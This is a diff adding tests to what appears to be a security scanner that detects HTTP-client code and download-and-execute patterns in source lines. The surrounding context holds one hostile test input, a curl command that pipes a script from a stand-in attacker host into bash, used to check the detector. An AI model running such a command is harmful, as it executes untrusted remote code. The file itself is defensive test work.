@@ -14,6 +14,37 @@ def test_http_client():
     assert f.severity.value == "MEDIUM"
 
 
+def test_http_client_is_code_not_prose():
+    """A client name in English prose is not network access."""
+    assert detect_http_client("so the next fetch is unconditional", "x.py", 1) is None
+    assert detect_http_client("requests that share a transport", "x.py", 2) is None
+    assert detect_http_client("what the parser got (after the fix)", "x.py", 3) is None
+    assert detect_http_client("see the docs, fetch (see below)", "x.py", 4) is None
+
+
+def test_urllib_parse_is_not_network():
+    """urlparse never opens a connection; urllib.request does."""
+    assert detect_http_client("from urllib.parse import urlparse", "x.py", 1) is None
+    assert detect_http_client("urlparse(url)", "x.py", 2) is None
+    f = detect_http_client("import urllib.request", "x.py", 3)
+    assert f is not None
+    assert detect_http_client("urllib.request.urlopen(url)", "x.py", 4) is not None
+
+
+def test_http_client_code_forms():
+    for line in (
+        "response = requests.get(url)",
+        "client = httpx.Client(timeout=5)",
+        "from aiohttp import ClientSession",
+        "const r = await fetch(url)",
+        "const r = await fetch(url)",
+        "axios.get(url)",
+        "const got = require('axios')",
+        "node-fetch(url)",
+    ):
+        assert detect_http_client(line, "x.py", 1) is not None, line
+
+
 def test_download_execute():
     f = detect_download_execute("curl https://evil.example.com/x.sh | bash", "x.sh", 1)
     assert f is not None
